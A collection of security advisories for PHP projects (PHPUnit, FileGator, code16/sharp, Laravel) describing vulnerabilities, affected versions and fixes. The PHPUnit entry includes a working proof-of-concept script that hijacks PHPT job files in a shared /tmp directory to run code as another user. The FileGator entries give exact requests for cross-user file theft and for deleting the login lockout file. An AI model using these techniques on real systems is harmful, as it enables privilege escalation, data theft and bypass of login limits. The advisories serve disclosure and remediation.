summary: PHPUnit vulnerable to code execution by other local users via shared temporary directory in PHPT code coverage handling
details:
### Summary

When PHPT tests are run with code coverage, PHPUnit 13.4.0 to 13.4.3 writes the code of each PHPT test to a directory with a fixed name below the operating system's path used for temporary files, for instance `/tmp/phpunit-phpt` on Linux, and executes it from there. PHPUnit uses this directory even when it was created by another user.

On a system where the path used for temporary files is shared between users, another local user can create this directory before the developer runs PHPUnit, replace the code of a PHPT test before it is executed, and thereby execute arbitrary code with the privileges of the developer. The test still passes and the code coverage report is complete, so the attack is not visible.

The impact is full code execution as the user who runs PHPUnit. The likelihood is low: the attacker needs an account on the same system and must create the directory before the developer runs PHPT tests with code coverage. macOS and Windows use per-user temporary directories by default and are not affected in their default configuration. PHPUnit 12.5 and earlier are not affected.

### Details

When code coverage is collected for a PHPT test, PHPUnit writes two temporary files: a `.php` file with the code of the PHPT test (the "job" file), which the child process executes, and a `.coverage` file, to which the child process writes the code coverage data it collected.

Since PHPUnit 13.4.0, these files are created in a directory with a fixed name:

* [`TestCase::coverageFilesDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L132-L143) returns `sys_get_temp_dir() . '/phpunit-phpt'`
* The [constructor](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L169-L174) names the files `phpunit_phpt_<random>.php` and `phpunit_phpt_<random>.coverage` in this directory

Before a PHPT test is run with code coverage, this directory is [created using `Filesystem::createDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L319). [`Filesystem::createDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Util/Filesystem.php#L27-L30) returns `true` when the directory already exists, without checking its owner or its permissions. When it does not exist, it is created with mode `0777` (subject to the umask).

[`Renderer::renderForCoverage()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/Renderer.php#L112) then writes the job file using `file_put_contents()`. The child process loads Composer's autoloader, the bootstrap script, and the code coverage driver, and then [executes the job file using `require`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/templates/phpt.tpl#L43).

When another user created the directory, that user owns it. The owner of a directory can list its contents and rename, delete, or replace every file in it, regardless of who owns the file. The directory does not have the sticky bit set, so protections such as Linux's `fs.protected_regular` and `fs.protected_symlinks` do not apply either. The random part of the file names therefore does not prevent the attack: the attacker waits for the job file to appear, renames it, and puts a file with their own code in its place. The attacker's code can then execute the original job file, so that the test passes and the code coverage report is complete.

The `.coverage` file can be replaced in the same way. [`TestCase::cleanupForCoverage()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L760-L803) only allows objects of PHPUnit's class for raw code coverage data to be unserialized from it, so this only allows the falsification of code coverage data.

After the test, PHPUnit deletes both files, but not the directory. Once PHPUnit has created the directory for the developer, other users cannot write to it, unless the developer's umask allows this.

PHPUnit 12.5 and earlier are not affected: these versions write the temporary files next to the PHPT test file.

PHPUnit 13.4.4 creates the directory for the temporary files of PHPT tests with an unpredictable name and with permissions that only allow the current user to access it. A directory that already exists is not used.

### Proof of concept

The following steps reproduce the issue on a Linux system with two users, `alice` (the developer) and `mallory` (the attacker), that share `/tmp`. They require PHP 8.4.1 or later with the `posix` extension and a code coverage driver (PCOV or Xdebug) as well as Composer.

1. As `root`, create the two users and make sure that `/tmp` has its default permissions (`1777`) and that `/tmp/phpunit-phpt` does not exist:

   ```
   useradd -m alice
   useradd -m mallory
   ls -ld /tmp
   rm -rf /tmp/phpunit-phpt
   ```

2. As `alice`, create a project with a PHPT test and a source file to collect code coverage for:

   ```
   mkdir -p ~/project/src ~/project/tests
   cd ~/project
   composer require --dev phpunit/phpunit:13.4.3
   ```

   `~/project/src/Greeter.php`:

   ```php
   <?php declare(strict_types=1);
   final class Greeter
   {
       public function greet(): string
       {
           return 'ok';
       }
   }
   ```

   `~/project/tests/greeter.phpt`:

   ```
   --TEST--
   PHPT test that is run with code coverage
   --FILE--
   <?php declare(strict_types=1);
   require __DIR__ . '/../src/Greeter.php';
   print (new Greeter)->greet();
   --EXPECT--
   ok
   ```

   `~/project/phpunit.xml`:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:noNamespaceSchemaLocation="vendor/phpunit/phpunit/phpunit.xsd">
       <source>
           <include>
               <directory>src</directory>
           </include>
       </source>
   </phpunit>
   ```

3. As `mallory`, save the following script as `~/attack.php` and run it using `php ~/attack.php`. It creates `/tmp/phpunit-phpt`, waits for job files to appear in it, and replaces each of them with code that records the identity of the user that executes it and then executes the original job file:

   ```php
   <?php declare(strict_types=1);
   $directory = '/tmp/phpunit-phpt';

   if (!@mkdir($directory)) {
       exit($directory . ' already exists' . PHP_EOL);
   }

   chmod($directory, 0777);

   $payload = '<?php file_put_contents(__DIR__ . "/proof.txt", shell_exec("id"), FILE_APPEND); require __FILE__ . ".orig";' . PHP_EOL;
   $replaced = [];

   while (true) {
       foreach (glob($directory . '/phpunit_phpt_*.php') as $job) {
           if (isset($replaced[$job])) {
               continue;
           }

           $replaced[$job] = true;

           file_put_contents($directory . '/payload.tmp', $payload);
           rename($job, $job . '.orig');
           rename($directory . '/payload.tmp', $job);

           print 'Replaced ' . $job . PHP_EOL;
       }

       usleep(1000);
   }
   ```

4. As `alice`, run the PHPT test with code coverage (when Xdebug is used, prefix the command with `XDEBUG_MODE=coverage`):

   ```
   cd ~/project
   vendor/bin/phpunit --coverage-text tests/greeter.phpt
   ```

   PHPUnit reports `OK (1 test, 1 assertion)`, and the code coverage report shows that `Greeter::greet()` is covered. Nothing in the output indicates that the code of the test was replaced.

5. Check which user executed the code that `mallory` put in place:

   ```
   cat /tmp/phpunit-phpt/proof.txt
   ```

   The file is owned by `alice` and contains the output of `id` for `alice`, for instance:

   ```
   uid=1000(alice) gid=1000(alice) groups=1000(alice)
   ```


### Impact

This is a local privilege escalation (CWE-379: Creation of Temporary File in Directory with Incorrect Permissions). A local user can execute arbitrary code with the privileges of another user who runs PHPT tests with code coverage. This gives the attacker access to everything the developer can access, for instance source code, credentials, and SSH keys.

Affected are users of PHPUnit 13.4.0 to 13.4.3 when all of the following apply:

* **PHPT tests with code coverage:** PHPT tests are run while code coverage is collected, which requires a code coverage driver such as PCOV or Xdebug
* **Shared path for temporary files:** The path used for temporary files (`sys_get_temp_dir()`) is shared between users. This is the case on Linux and other Unix-like systems with a shared `/tmp`, unless per-user temporary directories are used, for instance through systemd's `PrivateTmp`, `pam_namespace`, or a per-user `TMPDIR`. On macOS and Windows, the path used for temporary files is specific to the user by default
* **Local account:** The attacker has an account on the same system, or controls a process that runs under another account, for instance a service
* **First to create the directory:** The attacker creates the directory before the developer runs PHPT tests with code coverage for the first time since the path used for temporary files was last cleaned

Systems on which no other user, including system accounts that run services, can create files in the path used for temporary files are not affected. This is typically the case for a container or an ephemeral CI runner that is used by a single user.

summary: FileGator: Missing authorization in GET /batchdownload allows cross-user retrieval of another user's archive
details:
### Summary
`GET /batchdownload` streams a batch ZIP to any requester who supplies its `uniqid`, without checking that the current user/session created it. In deployments where users have separate home directories, a valid low-privileged user who obtains an active archive id can download another user's batch archive, disclosing files the per-user boundary otherwise protects. Reported with explicit preconditions and bounded impact — not a universal "any user steals any file" issue.

### Details
The archive id is generated with plain `uniqid()` and no ownership metadata is bound to it before streaming.

- `backend/Services/Archiver/Adapters/ZipArchiver.php:44` — `createArchive()` uses plain `uniqid()`.
- `backend/Controllers/DownloadController.php:144-145` — `batchDownloadStart()` reads the tmpfs file by the request-supplied `uniqid` after only a charset `preg_replace()`.
- `backend/Controllers/DownloadController.php:158` — the tmpfs archive is removed only after streaming.
- `backend/Controllers/routes.php:207-226` — both batch endpoints are exposed to normal roles with `read`, `download`, `batchdownload`.

No user id, session id, home directory, or creator check is applied before streaming. The code path is unchanged since commit `3f03a40` (2022-05-31) and is present in the latest release `v7.14.3`.

### PoC
Preconditions: a multi-user deployment with distinct per-user `homedir`s (set per-user in `users.json`, or `private_repos => true` on the WordPress/LDAP adapter). The shipped sample config (`admin`/`guest` both at `/`, `guest` with no perms) does not create this boundary on its own. Attacker is a valid user with `read`, `download`, `batchdownload`.

1. User John (`homedir /john`) creates `secret.txt`, signs in, and creates a batch archive via `POST /batchdownload`. The JSON response returns the archive `uniqid`.
2. User Jane (`homedir /jane`, with `batchdownload`) signs in normally.
3. Jane's direct `GET /download` of `/secret.txt` returns `302` — the normal home-directory boundary blocks the file.
4. Jane sends `GET /batchdownload?uniqid=<John's id>` and receives a valid ZIP containing `secret.txt` with John's content.

A PHPUnit proof with two real sessions reproduces this end to end (`OK, 3 tests / 29 assertions`), plus a lifecycle test (`OK, 2 tests / 9 assertions`). Full test files, run logs, and a real Apache access-log replay demo are available on request.

Lifetime / acquisition: a normal completed download removes the archive at the end of streaming, limiting the window. An aborted/failed download leaves the archive in tmpfs (cleanup never reached). The frontend issues the download as a top-level navigation (`window.open('.../batchdownload&uniqid='+ret.uniqid, '_blank')`), so the id appears in standard web access logs. That access-log path only adds meaningful impact when log visibility is decoupled from host filesystem access (e.g. a log-aggregation/shared-hosting/downstream-sink reader) and the archive is still alive; if the reader is ops/root on the same host they can already read the storage tree directly. The `uniqid()` token is timestamp-derived (1,000,000-value space per known second) — included to justify a CSPRNG, not presented as a practical universal brute force.

### Impact
Missing authorization (CWE-862) on a temporary download object, leading to cross-user file disclosure across the per-user home-directory boundary in configured multi-user deployments. Secondary effect: a successful replay deletes the victim's pending archive (the GET removes the tmpfs file after streaming), denying the victim their own download if not yet consumed.

Remediation: generate ids with `bin2hex(random_bytes(32))`; store creator user/session + home dir + expiry per archive id; verify the requester matches before streaming and return `403`/`404` on mismatch or unknown/expired id; delete metadata with the tmpfs file.

summary: FileGator: Missing authorization in POST /upload allows cross-user read and deletion of temporary files
details:
## Summary

`POST /upload` uses the request-supplied `resumableFilename` directly as a key into the shared temporary directory, without the character filter it applies to `resumableIdentifier` and without namespacing it per user. A valid user holding the `upload` permission can read any file in that directory into their own home directory, append to it, and delete it.

This reproduces the cross-user batch-archive disclosure of GHSA-f74m-x83r-c4v4 through a different route — it still works with the fix for that advisory (PR #597) applied — and additionally allows deleting the login rate-limit lockfile.

Reported with explicit preconditions and bounded impact, as before: the primitive is confined to the temporary directory, not the whole filesystem.

## Details

- `backend/Controllers/UploadController.php:61` — `$file_name = $request->input('resumableFilename', 'file')` is **not** passed through the `preg_replace('/[^0-9a-zA-Z_]/', '', ...)` that line 66 applies to `resumableIdentifier`.
- Line 88 builds `$prefix` namespaced by the sanitized username, but `$file_name` reaches the temporary storage at lines 118, 121 and 125 **without** that prefix.
- Line 115 — `if ($chunks_size >= $total_size)` is entered whenever `resumableTotalSize` is `0`.
- Lines 116-119 — the assembly loop `for ($i = 1; $i <= $total_chunks; ++$i)` does not execute when `resumableTotalChunks` is `0`, so nothing is written to `$file_name`.
- Line 121 — `readStream($file_name)` therefore reads the pre-existing temporary file of that exact name.
- Line 122 — its contents are stored into the requester's own home directory.
- Line 125 — `remove($file_name)` deletes it.

Path traversal outside the temporary directory is prevented by `Tmpfs::sanitizeFilename()`, so the primitive is bounded to that directory — but every user's transient objects share it.

## PoC

Preconditions: a multi-user deployment with distinct per-user `homedir`s. The attacker is a valid low-privileged user holding `upload` (a first-class permission in the admin UI, and present in the shipped `users.json.blank` admin set).

1. Victim creates a batch archive via `POST /batchdownload`; the JSON response returns the archive id.
2. Attacker sends **one** `POST /upload` with `resumableFilename=<victim's id>`, `resumableTotalChunks=0`, `resumableTotalSize=0`, `resumableRelativePath=/`, and any small valid file part.
3. Response is `{"data":"Stored"}`. The victim's archive is now byte-identical in the attacker's home directory, retrievable through the ordinary `GET /download`. The victim's temporary archive has been deleted.

Verified end to end with a PHPUnit test against current `master`; the archive contents matched byte for byte. Test file available on request.

## Impact

Missing authorization (CWE-862) on temporary storage objects.

- **Cross-user disclosure** of any transient object whose name the attacker can learn or predict. This includes batch archives — so GHSA-f74m-x83r-c4v4's impact remains reachable even with its fix applied — and the plaintext per-file copies that `ZipArchiver::addFileFromStorage()` writes while an archive is being built (those still use `uniqid()`, which is timestamp-derived).
- **Arbitrary delete** within the temporary directory. `AuthController::login()` stores the login rate-limit counter as `md5($ip).'.lock'` in that same directory (`backend/Controllers/AuthController.php:36`, checked at line 44, written at line 58). An attacker can compute their own lockfile name and delete it, defeating the lockout.
- **Arbitrary append**: with `resumableTotalChunks >= 1`, line 118 `write($file_name, ..., true)` appends attacker-controlled bytes to an arbitrary existing temporary file.

## Remediation

Do not use the request-supplied filename as a storage key. Namespace the assembly file per user — for example reuse the existing `$prefix` — and carry the display filename separately for the `storage->store()` call.

Note that simply applying the `[^0-9a-zA-Z_]` filter to `resumableFilename` would corrupt legitimate uploads (`sample.txt` becomes `sampletxt`), because `$final['filename']` is what becomes the stored name. The fix needs the namespacing, not just the filter.

summary: code16/sharp: Arbitrary class instantiation through the embed_key API parameter
details:
### Impact

An authenticated attacker can instantiate any class in the PHP application by using the `embed_key` parameter across multiple API endpoints. The instantiation is performed by the Laravel container. As a result, the `__construct()` method of the class is called and all constructor dependencies are resolved. The attacker cannot specify parameter values and cannot call any arbitrary method.

### Patches

The problem has been patched in 9.23.0 and pre-release version 10.0.0-beta.4. An additional check was added to verify that `embed_key` is a class extending `SharpFormEditorEmbed` before any instantiation.

### Workarounds

No known workarounds.

summary: code16/sharp: Server-side request forgery through an unanchored autocomplete endpoint check
details:
### Impact
An authenticated attacker can call the Autocomplete API with the configured endpoint as a substring to request another server-side route.

### Patches
The problem has been patched in 9.23.0 and pre-release version 10.0.0-beta.4. The regex verifying the endpoint has been anchored to forbid substring injection.

### Workarounds
Use `SharpFormAutocompleteRemoteField::setRemoteCallback()` instead of `SharpFormAutocompleteRemoteField::setRemoteEndpoint()`.

summary: Laravel: Task Output Injection - Concurrency Process
details:
### Summary

If a concurrency task prints user-controlled text, an attacker can forge the framework's internal result message and achieve remote code execution in certain conditions

### Pre-reqs

Insecure code and insecure handling of user provided input (devs trust user-provided input) :

1. App has a route that reaches Concurrency::run() (Not by default, it requires app code)

2. The task writes user-controlled data to stdout (echo/print/`dd` of input, hand-built JSON via string concat, passthrough of tool output), and the user-controlled bytes can be made to start the child's stdout and form a complete JSON document followed by \x1f\x8b  (Not by default, requires the specific coding pattern in the app code)

### Patches
* 13.40.0
* 12.71.0
